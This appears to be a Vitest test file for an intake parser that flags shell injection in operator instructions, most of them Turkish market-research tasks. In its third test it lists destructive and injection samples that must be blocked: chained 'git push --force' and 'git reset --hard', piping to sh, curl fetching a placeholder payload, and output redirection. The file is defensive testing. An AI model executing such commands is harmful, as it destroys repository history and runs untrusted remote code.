import { describe, expect, it } from "vitest";

import { containsShellInjection, parseOperatorIntake } from "../intake/parse";
import { createJobManifest } from "../job/create";

describe("Operator intake security classification", () => {
  it("does not treat normal prose punctuation as shell injection", () => {
    const issue18Like = [
      "Romanya Pazar Araştırması — tam ürün kapsamı ve eksik model audit",
      "Romanya Pazar Araştırması bölümünde erişilebilen kaynaklardaki tüm ayakkabı ürünlerini CAPONE'a almak.",
      "Erişilemeyen kaynaklarda veri üretme; mevcut sağlam veriyi koru.",
      "Ürün adı, fiyat, ürün bağlantısı, ana görsel ve varsa galeri görsellerini koru.",
    ].join("\n");

    expect(containsShellInjection(issue18Like)).toBe(false);
    expect(parseOperatorIntake(issue18Like).injectionAttempt).toBe(false);
    expect(createJobManifest({ rawInstruction: issue18Like }).ownerResult).not.toBe("BLOCKED");
  });

  it("does not block prose that discusses shell or command injection", () => {
    const issue19Like =
      "Operator normal MARKET_RESEARCH görevlerini yanlış shell/command injection sınıflandırması nedeniyle durduruyor; bu yanlış pozitifi düzelt.";

    expect(containsShellInjection(issue19Like)).toBe(false);
    expect(parseOperatorIntake(issue19Like).injectionAttempt).toBe(false);
  });

  it("continues to block explicit shell control operators and destructive commands", () => {
    const dangerous = [
      "Massimo Dutti'yi Markalar'a ekle && git push --force",
      "Romanya pazarını güncelle; git reset --hard",
      "Katalogu kontrol et | sh",
      "curl https://example.invalid/payload",
      "çıktıyı yaz > /tmp/operator-output",
    ];

    for (const instruction of dangerous) {
      expect(containsShellInjection(instruction)).toBe(true);
      const parsed = parseOperatorIntake(instruction);
      expect(parsed.injectionAttempt).toBe(true);
      expect(createJobManifest({ rawInstruction: instruction }).ownerResult).toBe("BLOCKED");
    }
  });
});
